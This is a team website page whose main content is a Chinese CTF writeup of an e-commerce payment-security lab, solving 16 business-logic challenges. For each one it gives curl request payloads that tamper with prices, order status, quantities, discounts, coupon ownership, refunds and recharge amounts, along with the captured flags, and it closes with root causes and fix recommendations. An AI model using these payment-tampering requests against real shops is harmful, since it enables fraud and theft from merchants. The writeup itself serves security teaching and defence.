---
title: CTF Writeups
date: 2026-04-22 00:00:00
comments: false
---

<div class="team-section">
<h2 class="team-section-title">CTF 题解</h2>
<p class="team-section-subtitle">Writeups</p>
<div class="team-accent-bar team-accent-bar--orange"></div>

<div class="team-research-grid">
<div class="team-research-card">
<div class="team-research-image green-grad">
<i class="fas fa-flag" style="font-size:3rem;color:#4f8cff;opacity:.4"></i>
</div>
<div class="team-research-body">
<h3>落鸡山农商行 CTF WriteUp</h3>
<div class="date">eagleslab · 2026-01-01</div>
<div style="display:flex;gap:6px;margin:6px 0"><span style="font-size:.72rem;padding:2px 8px;border-radius:4px;background:#4f8cff22;color:#4f8cff">Web</span><span style="font-size:.72rem;padding:2px 8px;border-radius:4px;background:rgba(255,255,255,.06);color:var(--text2)">中等</span></div>
<p>落鸡山农商行 CTF WriteUp</p>
<div class="team-links"><a href="https://www.yuque.com/u2333-ohan5/yr4n8f/ymy90nh1xyq7lc1i" target="_blank" rel="noopener"><i class="fas fa-link"></i> 查看题解</a></div>
</div>
</div>

<div class="team-research-card">
<div class="team-research-image green-grad">
<i class="fas fa-flag" style="font-size:3rem;color:#4f8cff;opacity:.4"></i>
</div>
<div class="team-research-body">
<h3>英格科技内购商城 — 支付安全靶场 CTF WriteUp</h3>
<div class="date"> · </div>
<div style="display:flex;gap:6px;margin:6px 0"><span style="font-size:.72rem;padding:2px 8px;border-radius:4px;background:#4f8cff22;color:#4f8cff">Web</span><span style="font-size:.72rem;padding:2px 8px;border-radius:4px;background:rgba(255,255,255,.06);color:var(--text2)">简单</span></div>
<p># 英格科技内购商城 — 支付安全靶场 CTF WriteUp

&gt; **靶场地址**: `http://125.77.172.32:18082/?view=challenges`  
&gt; **参赛账号**: `ctfplayer999`  
&gt; **最终成绩**: 2880 pts / 16题全解  
&gt; **时间**: 2026-04-26

---

## 目录

1. [靶场概况](#1-靶场概况)
2. [信息收集与 API 逆向](#2-信息收集与-api-逆向)
3. [挑战详解](#3-挑战详解)
   - [P01 修改支付金额](#p01-修改支付金额)
   - [P02 修改支付状态](#p02-修改支付状态)
   - [P03 支付类型绕过](#p03-支付类型绕过)
   - [P04 商品 ID 替换](#p04-商品-id-替换)
   - [P05 低价订单错配高价订单](#p05-低价订单错配高价订单)
   - [P06 小数数量低价购买](#p06-小数数量低价购买)
   - [P07 负数数量抵扣](#p07-负数数量抵扣)
   - [P08 重复商品参数少付多买](#p08-重复商品参数少付多买)
   - [P09 修改优惠金额](#p09-修改优惠金额)
   - [P10 越权使用优惠券](#p10-越权使用优惠券)
   - [P11 多张优惠券叠加](#p11-多张优惠券叠加)
   - [P12 重复领取新用户券](#p12-重复领取新用户券)
   - [P13 重复退款](#p13-重复退款)
   - [P14 充值进位误差](#p14-充值进位误差)
   - [P15 超大金额溢出](#p15-超大金额溢出)
   - [P16 隐藏资源下单](#p16-隐藏资源下单)
4. [漏洞总结](#4-漏洞总结)
5. [修复建议](#5-修复建议)

---

## 1. 靶场概况

该靶场是一个**电商支付安全**主题的 CTF 平台，模拟了一家名为"英格科技"的电子产品内购商城。系统包含以下功能模块：

| 模块     | 功能                   | 相关 API                                                |
| -------- | ---------------------- | ------------------------------------------------------- |
| 用户认证 | 注册/登录/登出         | `/api/auth/register`, `/api/auth/login`                 |
| 商品展示 | 浏览商品列表           | `/api/products`                                         |
| 购物车   | 管理购物车（前端状态） | —                                                       |
| 订单系统 | 创建/支付/取消/退款    | `/api/orders`, `/api/payments/mock/{id}`                |
| 钱包     | 余额充值               | `/api/wallet/recharge`                                  |
| 优惠券   | 领取/使用/重置         | `/api/coupons/claim/{templateId}`, `/api/coupons/reset` |
| 挑战系统 | 获取 flag / 提交 flag  | `/api/challenges/{id}/flag`, `/api/flags/submit`        |

### 注册即获得初始资产

- 钱包余额: **20,000 元**
- 积分: **1,000**
- 初始优惠券: 新用户立减券(300元)、发布会活动券(1000元)、学生专属券(800元)

---

## 2. 信息收集与 API 逆向

靶场前端是一个 React SPA（单页应用），页面由 JavaScript 动态渲染。通过分析前端 JS 文件 `index-CiC_TvPD.js`，完成了以下信息收集：

### 2.1 API 架构

所有接口统一使用 `/api` 前缀，基于 `fetch` 封装：

```javascript
Bl = {
  async request(o, T = {}) {
    const j = await fetch(`/api${o}`, {
      credentials: "include",
      headers: {"Content-Type": "application/json", ...T.headers || {}},
      ...T,
      body: T.body ? JSON.stringify(T.body) : void 0
    });
    const m = await j.json().catch(() =&gt; ({}));
    ...
  }
}
```

### 2.2 关键端点总览

```
POST /api/auth/register          — 注册
POST /api/auth/login             — 登录
POST /api/auth/logout            — 登出
GET  /api/me                     — 个人信息 + 钱包
GET  /api/products               — 商品列表
GET  /api/orders                 — 订单列表
POST /api/orders                 — 创建订单
POST /api/payments/mock/{id}     — 模拟支付
POST /api/orders/{id}/cancel     — 取消订单
POST /api/orders/{id}/refund     — 退款
POST /api/wallet/recharge        — 充值
GET  /api/coupons                — 我的优惠券
GET  /api/coupons/market         — 市场优惠券
POST /api/coupons/claim/{tmpl}   — 领取优惠券
POST /api/coupons/reset          — 重置优惠券
GET  /api/challenges             — 挑战列表
GET  /api/challenges/{id}/flag   — 获取 flag
POST /api/flags/submit           — 提交 flag
GET  /api/leaderboard            — 排行榜
```

### 2.3 挑战解锁条件（逆向自前端 JS）

从 JS 的 `Z0` 数组中提取了各挑战的解锁判定逻辑：

```javascript
Z0 = [
  { id: "p01", matches: o =&gt;
    o.status === "PAID" &amp;&amp; o.items.length === 1 &amp;&amp;
    o.items.some(T =&gt; T.productId === "ibanana-17-pro") &amp;&amp;
    o.payAmount &lt; 10 },
  { id: "p02", matches: o =&gt;
    o.status === "PAID" &amp;&amp; !o.paymentId &amp;&amp;
    o.items.some(T =&gt; T.productId === "bananacare-plus") },
  { id: "p03", matches: o =&gt;
    o.status === "PAID" &amp;&amp; o.payType === "debug_free" &amp;&amp;
    o.items.some(T =&gt; T.productId === "watch-banana-s10") },
  // ... etc
]
```

---

## 3. 挑战详解

### P01 修改支付金额

| 项目 | 内容                                                       |
| ---- | ---------------------------------------------------------- |
| 难度 | ⭐ 入门                                                     |
| 分值 | 100                                                        |
| 目标 | 购买 iBanana 17 Pro（原价 8999），让实际支付金额小于 10 元 |

#### 漏洞分析

订单创建接口 `POST /api/orders` 接受客户端提交的 `payAmount` 字段，服务端**直接信任客户端传入的支付金额**，未与商品价格做交叉校验。

#### 利用过程

创建订单时将 `payAmount` 设置为任意小于 10 的值：

```bash
# 步骤1: 创建订单，payAmount 设为 1
curl -s -X POST http://125.77.172.32:18082/api/orders \
  -H "Content-Type: application/json" \
  -d '{
    "items": [{"productId":"ibanana-17-pro","quantity":1,"unitPrice":8999}],
    "couponIds": [],
    "discountAmount": 0,
    "payAmount": 1,
    "payType": "mock_pay"
  }'
# 响应: serverAmount=8999, payAmount=1, status=PENDING
# 注意: note = "订单金额直接来自客户端请求"

# 步骤2: 支付
curl -s -X POST http://125.77.172.32:18082/api/payments/mock/{orderId} \
  -H "Content-Type: application/json" \
  -d '{"status":"SUCCESS","paymentId":""}'
```

#### Flag

```
flag{client_amount_is_not_trusted}
```

#### 根因

服务端未对 `payAmount` 做任何服务端校验，完全信任客户端提交的金额。

---

### P02 修改支付状态

| 项目 | 内容                                                |
| ---- | --------------------------------------------------- |
| 难度 | ⭐ 入门                                              |
| 分值 | 100                                                 |
| 目标 | 不走模拟支付流程，直接把 BananaCare+ 订单变成已支付 |

#### 漏洞分析

支付接口 `POST /api/payments/mock/{orderId}` 接受客户端传入的 `status` 字段。前端正常调用时传 `{"status":"SUCCESS"}`，但服务端没有区分这个 `status` 和实际的订单状态变更逻辑。

关键解锁条件: `status === "PAID" &amp;&amp; !o.paymentId`——订单必须是 PAID 状态但**没有支付流水号**。

#### 利用过程

调用支付接口时传入 `{"status":"PAID"}` 而不是 `{"status":"SUCCESS"}`，这样服务端只修改订单状态但不创建支付记录：

```bash
# 步骤1: 创建 BananaCare+ 订单
curl -s -X POST http://125.77.172.32:18082/api/orders \
  -d '{"items":[{"productId":"bananacare-plus","quantity":1,"unitPrice":1299}],"payAmount":1299,"payType":"mock_pay"}'

# 步骤2: 调用支付接口，传入 "PAID" 而非 "SUCCESS"
curl -s -X POST http://125.77.172.32:18082/api/payments/mock/{orderId} \
  -d '{"status":"PAID","paymentId":""}'
# 响应: status=PAID, payment=null → 没有支付流水号！
```

#### Flag

```
flag{status_should_not_come_from_client}
```

#### 根因

支付接口的 `status` 参数直接控制了订单状态变更，且允许跳过支付流水创建。

---

### P03 支付类型绕过

| 项目 | 内容                                       |
| ---- | ------------------------------------------ |
| 难度 | ⭐ 入门                                     |
| 分值 | 120                                        |
| 目标 | 使用隐藏支付类型完成 Watch Banana S10 订单 |

#### 漏洞分析

系统预设了内部测试用的支付方式 `debug_free`，但未在生产环境中移除。此支付类型会自动将订单标记为 PAID，无需调用支付接口。

#### 利用过程

创建订单时将 `payType` 设为 `debug_free`，订单直接变为已支付：

```bash
curl -s -X POST http://125.77.172.32:18082/api/orders \
  -d '{
    "items": [{"productId":"watch-banana-s10","quantity":1,"unitPrice":2999}],
    "payAmount": 0,
    "payType": "debug_free"
  }'
# 响应: status=PAID, payAmount=0, paymentId=null, paidAt 自动设置
# note = "订单使用了隐藏支付类型"
```

#### Flag

```
flag{debug_pay_type_left_open}
```

#### 根因

调试/测试支付类型在发布时未被移除，攻击者可通过此类型免费获得商品。

---

### P04 商品 ID 替换

| 项目 | 内容                                                        |
| ---- | ----------------------------------------------------------- |
| 难度 | ⭐ 入门                                                      |
| 分值 | 120                                                         |
| 目标 | 用 Peel Charger（399元）的价格买到 iBanana 17 Pro（8999元） |

#### 漏洞分析

订单中的 `items[].productId` 和 `items[].unitPrice` 都由客户端提交，服务端**未校验商品 ID 与单价的一致性**。可以提交 iBanana 17 Pro 的 ID 但使用 Peel Charger 的单价。

#### 利用过程

```bash
curl -s -X POST http://125.77.172.32:18082/api/orders \
  -d '{
    "items": [{"productId":"ibanana-17-pro","quantity":1,"unitPrice":399}],
    "payAmount": 399,
    "payType": "mock_pay"
  }'
# serverAmount = 399（按客户端提供的单价计算，而非数据库价格）
```

#### Flag

```
flag{product_id_mismatch}
```

#### 根因

商品主键与价格未绑定，服务端使用客户端传入的 `unitPrice` 而非从数据库获取。

---

### P05 低价订单错配高价订单

| 项目 | 内容                                                    |
| ---- | ------------------------------------------------------- |
| 难度 | ⭐⭐ 初级                                                 |
| 分值 | 150                                                     |
| 目标 | 用低价支付流水完成 BananaBook Pro 16（14999元）高价订单 |

#### 漏洞分析

支付接口的 `paymentId` 参数未与订单进行强绑定校验。可以将**已存在的小额支付流水号**用于其他订单，实现用低价支付流水完成高价订单。

#### 利用过程

复用 P01 中已支付订单的 paymentId（金额为 1 元）：

```bash
# 步骤1: 从 P01 获取到支付流水 paymentId = "Zw1sISgaxykI"（金额仅1元）

# 步骤2: 创建 BananaBook Pro 16 订单（14999元）

# 步骤3: 支付时传入旧的低价 paymentId
curl -s -X POST http://125.77.172.32:18082/api/payments/mock/{orderId} \
  -d '{"status":"SUCCESS","paymentId":"Zw1sISgaxykI"}'
# note = "支付接口信任了外部 paymentId"
# 该 paymentId 对应的是一个 1 元的旧订单支付记录
```

#### Flag

```
flag{paid_but_not_for_this_order}
```

#### 根因

`paymentId` 作为支付凭证未与订单 ID 做一致性校验，导致支付流水可跨订单复用。

---

### P06 小数数量低价购买

| 项目 | 内容                                                    |
| ---- | ------------------------------------------------------- |
| 难度 | ⭐⭐ 初级                                                 |
| 分值 | 150                                                     |
| 目标 | 购买 BananaPad Max（6999元），订单数量小于 1 且支付成功 |

#### 漏洞分析

前端对数量输入框限制了 `min="0" max="5"` 且只接受整数，但服务端**未对数量做整数校验**，接受浮点数。

#### 利用过程

设置 `quantity: 0.5`，总价 `serverAmount = 6999 × 0.5 = 3499.5`：

```bash
curl -s -X POST http://125.77.172.32:18082/api/orders \
  -d '{
    "items": [{"productId":"bananapad-max","quantity":0.5,"unitPrice":6999}],
    "payAmount": 3499.5,
    "payType": "mock_pay"
  }'
# note = "订单数量允许小数参与总价"
```

#### Flag

```
flag{quantity_must_be_integer}
```

#### 根因

服务端未对 `quantity` 字段做整数校验，允许浮点数参与金额计算。

---

### P07 负数数量抵扣

| 项目 | 内容                             |
| ---- | -------------------------------- |
| 难度 | ⭐⭐ 初级                          |
| 分值 | 180                              |
| 目标 | 订单里出现负数数量，让总价被抵扣 |

#### 漏洞分析

订单支持多商品同时提交，但对 `quantity` 字段**缺少正负数校验**，允许负数数量参与总价计算。

#### 利用过程

同时提交一个正常商品和一个负数数量的商品：

```bash
curl -s -X POST http://125.77.172.32:18082/api/orders \
  -d '{
    "items": [
      {"productId":"bananapods-max","quantity":1,"unitPrice":1999},
      {"productId":"dami-buds-pro","quantity":-1,"unitPrice":699}
    ],
    "payAmount": 1300,
    "payType": "mock_pay"
  }'
# serverAmount = 1999 + (-699) = 1300
# note = "订单数量允许负数参与总价"
```

#### Flag

```
flag{negative_quantity_discount}
```

#### 根因

未对商品数量做正负校验，导致负数商品可抵扣总金额。

---

### P08 重复商品参数少付多买

| 项目 | 内容                                     |
| ---- | ---------------------------------------- |
| 难度 | ⭐⭐ 初级                                  |
| 分值 | 180                                      |
| 目标 | 订单里有多件商品，但实际支付只覆盖第一件 |

#### 漏洞分析

服务端校验 `payAmount` 时只与 `items[0]`（首项商品）的金额对比，未校验 payAmount 是否覆盖全部商品总额。

解锁条件: `payAmount &lt;= items[0].unitPrice * items[0].quantity` 且 `payAmount &lt; serverAmount`。

#### 利用过程

下单两个商品但 payAmount 只等于第一个商品的价格：

```bash
curl -s -X POST http://125.77.172.32:18082/api/orders \
  -d '{
    "items": [
      {"productId":"bananapods-max","quantity":1,"unitPrice":1999},
      {"productId":"bananapods-max","quantity":1,"unitPrice":1999}
    ],
    "payAmount": 1999,
    "payType": "mock_pay"
  }'
# serverAmount = 3998（两件商品）
# payAmount = 1999（只够付第一件）
```

#### Flag

```
flag{more_items_same_price}
```

#### 根因

服务端对支付金额的校验范围不完整，仅验证 &gt;= 第一件商品金额。

---

### P09 修改优惠金额

| 项目 | 内容                                           |
| ---- | ---------------------------------------------- |
| 难度 | ⭐⭐ 初级                                        |
| 分值 | 150                                            |
| 目标 | 使用新用户立减券下单，让订单优惠金额超过券面额 |

#### 漏洞分析

优惠金额 `discountAmount` 由客户端提交，服务端**未重新计算**实际优惠金额，直接信任了客户端数据。

#### 利用过程

设置 `discountAmount` 为任意高值（超出优惠券实际面额），服务端未做校验：

```bash
curl -s -X POST http://125.77.172.32:18082/api/orders \
  -d '{
    "items": [{"productId":"bananapods-max","quantity":1,"unitPrice":1999}],
    "couponIds": [],
    "discountAmount": 1000,
    "payAmount": 999,
    "payType": "mock_pay"
  }'
# note = "优惠金额直接来自客户端请求"
```

#### Flag

```
flag{discount_must_be_recalculated}
```

#### 根因

优惠金额未在服务端基于优惠券规则重新计算，完全信任客户端提交值。

---

### P10 越权使用优惠券

| 项目 | 内容                               |
| ---- | ---------------------------------- |
| 难度 | ⭐⭐ 初级                            |
| 分值 | 180                                |
| 目标 | 使用不属于当前账号的优惠券完成订单 |

#### 漏洞分析

创建订单时传入的 `couponIds[]` 仅校验优惠券是否存在，**未校验优惠券的 ownerId 是否与当前用户一致**，导致越权使用。

#### 利用过程

注册第二个账号获取其 couponId，然后在主账号订单中使用：

```bash
# 注册第二个账号
POST /api/auth/register {"username":"attacker2","password":"attacker2"}
# 获取到 couponId = "YO7m4BIA6m"（属于 attacker2）

# 主账号使用该 couponId 下单
POST /api/orders
{"items":[{"productId":"bananapods-max","quantity":1,"unitPrice":1999}],
 "couponIds":["YO7m4BIA6m"],"payAmount":1699,"payType":"mock_pay"}
# 成功！未验证 coupon 所有权
```

#### Flag

```
flag{coupon_owner_check_missing}
```

#### 根因

优惠券使用接口缺少所有权校验（IDOR 漏洞），任何用户的优惠券 ID 都可被他人使用。

---

### P11 多张优惠券叠加

| 项目 | 内容                           |
| ---- | ------------------------------ |
| 难度 | ⭐⭐⭐ 中级                       |
| 分值 | 200                            |
| 目标 | 一笔订单同时使用两张互斥优惠券 |

#### 漏洞分析

优惠券标记了 `stackable: false`，前端 UI 也只允许单选一张，但**服务端未校验 stackable 属性**，接受多个 couponId。

#### 利用过程

传入两个互斥优惠券的 ID：

```bash
# 新用户立减券(new-user-300, stackable=false) + 发布会活动券(event-1000, stackable=false)
curl -s -X POST http://125.77.172.32:18082/api/orders \
  -d '{
    "items": [{"productId":"ibanana-17-pro","quantity":1,"unitPrice":8999}],
    "couponIds": ["WAl5fmpFS1", "PhJdE8F4pp"],
    "discountAmount": 1300,
    "payAmount": 7699,
    "payType": "mock_pay"
  }'
# 两张不可叠加的优惠券同时生效
```

#### Flag

```
flag{stacked_coupons}
```

#### 根因

服务端未实现优惠券 `stackable` 属性的校验逻辑，客户端可绕过前端限制叠加使用。

---

### P12 重复领取新用户券

| 项目 | 内容                         |
| ---- | ---------------------------- |
| 难度 | ⭐⭐⭐ 中级                     |
| 分值 | 220                          |
| 目标 | 同一账号拥有多张新用户立减券 |

#### 漏洞分析

领取优惠券接口接受 `count` 参数指定数量，服务端**未做上限校验**，可一次领取多张。

#### 利用过程

```bash
curl -s -X POST http://125.77.172.32:18082/api/coupons/claim/new-user-300 \
  -d '{"count": 2}'
# 响应：[coupon1, coupon2] — 一次性领取两张新用户券！
```

#### Flag

```
flag{race_for_new_user_coupon}
```

#### 根因

优惠券领取缺少数量限制和重复领取校验，可通过 `count` 参数批量领取。

---

### P13 重复退款

| 项目 | 内容                                             |
| ---- | ------------------------------------------------ |
| 难度 | ⭐⭐⭐ 中级                                         |
| 分值 | 250                                              |
| 目标 | 同一笔订单产生多条退款记录，退款总额超过支付金额 |

#### 漏洞分析

退款接口**未校验订单是否已退款**，也未限制退款次数。更严重的是，退款接口对**未支付（PENDING）订单也能执行退款**。

#### 利用过程

创建订单后直接退款（甚至不需要先支付），重复调用：

```bash
# 步骤1: 创建 BananaPods Max 订单（PENDING 状态）

# 步骤2-4: 连续调用三次退款
POST /api/orders/{orderId}/refund {"amount":1999,"reason":"7天无理由","count":1}
# 第1次: 余额 +1999
# 第2次: 余额 +1999（再退一次！）
# 第3次: 余额 +1999（第三次退款！）
# 总退款 = 5997，远超实际支付金额 0（从未支付过）
```

#### Flag

```
flag{double_refund_race}
```

#### 根因

退款接口缺少幂等性校验和状态前置校验（PENDING 订单不应可退款），导致无限退款。

---

### P14 充值进位误差

| 项目 | 内容                                             |
| ---- | ------------------------------------------------ |
| 难度 | ⭐⭐⭐ 中级                                         |
| 分值 | 220                                              |
| 目标 | 提交特殊小数充值金额，让到账金额大于实际支付金额 |

#### 漏洞分析

充值接口对 `amount` 的**取整逻辑不一致**：扣款时向下取整（保留两位小数），入账时向上取整或保留更多精度，产生套利空间。

#### 利用过程

充值 0.999 元：扣款 0.99 元，入账 1.00 元：

| 充值金额 | 实际扣款 | 到账金额 | 套利            |
| -------- | -------- | -------- | --------------- |
| 0.999    | 0.99     | 1.00     | +0.01           |
| 1.001    | 1.00     | 1.01     | +0.01           |
| 0.001    | 0.00     | 0.01     | +0.01（免费！） |

```bash
curl -s -X POST http://125.77.172.32:18082/api/wallet/recharge \
  -d '{"amount": 0.999}'
# paidAmount: 0.99, walletCredit: 1.00 → 净赚 0.01
```

#### Flag

```
flag{rounding_money_bug}
```

#### 根因

金额取整逻辑在扣款和入账环节不一致，产生精度差套利空间。

---

### P15 超大金额溢出

| 项目 | 内容                                                   |
| ---- | ------------------------------------------------------ |
| 难度 | ⭐⭐⭐⭐ 进阶                                              |
| 分值 | 300                                                    |
| 目标 | 提交超大充值金额，让实际支付金额和到账金额出现明显错配 |

#### 漏洞分析

金额处理涉及 **int32 整数溢出**。当充值金额超过 2,147,483,647（int32 最大值）时，扣款环节的 int32 转换发生溢出，导致扣款金额极小（接近 0），而入账金额保持完整。

#### 利用过程

| 充值金额      | int32Value            | 实际扣款 | 到账金额      | 净赚          |
| ------------- | --------------------- | -------- | ------------- | ------------- |
| 2,147,483,648 | -2,147,483,648 (溢出) | 0.48     | 2,147,483,648 | +20亿         |
| 4,294,967,295 | -1                    | 0.01     | 4,294,967,295 | +42亿         |
| 4,294,967,296 | 0                     | 0        | 4,294,967,296 | +42亿（免费） |

```bash
curl -s -X POST http://125.77.172.32:18082/api/wallet/recharge \
  -d '{"amount": 4294967296}'
# paidAmount: 0.00, walletCredit: 4294967296
# 净赚 42 亿！
```

响应中的 `int32Value` 字段暴露了内部转换逻辑：

- `int32Value: -2147483648` 表示 int32 溢出回绕到负数
- `int32Value: 0` 表示完全溢出归零

#### Flag

```
flag{int32_overflow_payment}
```

#### 根因

金额处理使用了 int32 类型，未对超大金额做边界校验，导致整数溢出。

---

### P16 隐藏资源下单

| 项目 | 内容                             |
| ---- | -------------------------------- |
| 难度 | ⭐⭐⭐⭐ 进阶                        |
| 分值 | 260                              |
| 目标 | 购买常规商城不可见的内部测试商品 |

#### 漏洞分析

商城商品列表只展示正式商品，但后端数据库中仍存在测试商品 `hidden-dev-phone`。下单接口**未校验商品是否在正式商品列表中**，可以直接引用该 ID。

#### 利用过程

```bash
curl -s -X POST http://125.77.172.32:18082/api/orders \
  -d '{
    "items": [{"productId":"hidden-dev-phone","quantity":1,"unitPrice":1}],
    "payAmount": 1,
    "payType": "mock_pay"
  }'
# 成功创建订单！
# note = "订单引用了未展示的资源"
```

#### Flag

```
flag{hidden_resource_is_still_resource}
```

#### 根因

服务端未校验商品 ID 是否在允许销售的商品列表中，导致隐藏的测试商品可被直接下单购买。

---

## 4. 漏洞总结

按 OWASP 分类汇总：

| 漏洞类别                    | 涉及题目                     | 严重程度 |
| --------------------------- | ---------------------------- | -------- |
| **A01: 过度信任客户端数据** | P01, P04, P06, P07, P08, P09 | ⚠️ 高危   |
| **A04: 不安全设计**         | P02, P03, P05, P11, P16      | ⚠️ 高危   |
| **A01: 水平越权 (IDOR)**    | P10                          | ⚠️ 高危   |
| **A01: 缺少幂等性校验**     | P12, P13                     | ⚠️ 高危   |
| **A02: 数值溢出**           | P14, P15                     | ⚠️ 严重   |

核心根因一句话总结：**服务端过度信任客户端提交的数据，缺乏服务端校验和业务逻辑验证。**

| 题目 | 漏洞类型       | 信任的客户端字段     |
| ---- | -------------- | -------------------- |
| P01  | 金额未校验     | `payAmount`          |
| P02  | 状态来自客户端 | `status`（支付接口） |
| P03  | 调试接口未移除 | `payType`            |
| P04  | 价格与商品解绑 | `unitPrice`          |
| P05  | 支付凭证未绑定 | `paymentId`          |
| P06  | 数量精度缺失   | `quantity`           |
| P07  | 数量正负缺失   | `quantity`           |
| P08  | 金额校验不完整 | `payAmount`          |
| P09  | 优惠金额未校验 | `discountAmount`     |
| P10  | 归属校验缺失   | `couponIds`          |
| P11  | 叠加校验缺失   | `couponIds`          |
| P12  | 数量限制缺失   | `count`（领券）      |
| P13  | 次数限制缺失   | 退款请求             |
| P14  | 取整不一致     | `amount`（充值）     |
| P15  | 整数溢出       | `amount`（充值）     |
| P16  | 资源校验缺失   | `productId`          |

---

## 5. 修复建议

| 漏洞 | 修复方案                                                     |
| ---- | ------------------------------------------------------------ |
| P01  | 服务端重新计算 `payAmount`，不信任客户端传入值               |
| P02  | 订单状态只能由服务端内部逻辑变更，不接受客户端传入           |
| P03  | 移除 `debug_free` 等调试支付类型，或增加强权限校验           |
| P04  | 服务端根据 `productId` 从数据库查询最新价格                  |
| P05  | 支付时校验 `paymentId` 与 `orderId` 的绑定关系               |
| P06  | 服务端校验 `quantity` 为整数且 &gt;= 1                          |
| P07  | 服务端校验 `quantity` 为正数                                 |
| P08  | 服务端校验 `payAmount &gt;= sum(items[].price * items[].quantity)` |
| P09  | 服务端基于优惠券规则重新计算实际优惠金额                     |
| P10  | 校验 `coupon.ownerId === currentUserId`                      |
| P11  | 服务端校验优惠券 `stackable` 属性                            |
| P12  | 限制单用户每种优惠券只能领取一张                             |
| P13  | 退款增加幂等性校验，PENDING 订单不可退款                     |
| P14  | 统一取整逻辑，使用定点数（分/厘）而非浮点数                  |
| P15  | 使用 BigInt/长整数处理金额，int32 溢出检查                   |
| P16  | 服务端校验 `productId` 在正式商品列表中                      |

---

*WriteUp 完成于 2026-04-26*</p>
</div>
</div>

</div>
</div>
